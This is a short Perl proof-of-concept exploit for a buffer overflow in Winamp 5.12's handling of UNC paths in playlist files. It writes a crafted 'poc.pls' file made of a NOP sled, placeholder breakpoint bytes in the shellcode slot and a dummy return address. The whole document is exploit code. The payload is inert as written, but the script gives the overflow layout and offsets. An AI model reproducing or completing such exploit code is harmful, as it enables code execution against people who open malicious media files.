#!/usr/bin/perl -w
# ====================================================================
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Perl Exploit
# Original Poc by Umesh Wanve (umesh_345@yahoo.com)
# ====================================================================

$start= "[playlist]\r\nFile1=\\\\";
$nop="\x90" x 856 ;
$shellcode = "\xcc" x 166;
$jmp="\x41\x41\x41\x41"."\x83\x83\x83\x83\x83\x83\x83\x83"."\x90\x90\x90\x90";
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
open (MYFILE, '>poc.pls');
print MYFILE $start;
print MYFILE $nop;
print MYFILE $shellcode;
print MYFILE $jmp;
print MYFILE $end;
close (MYFILE);
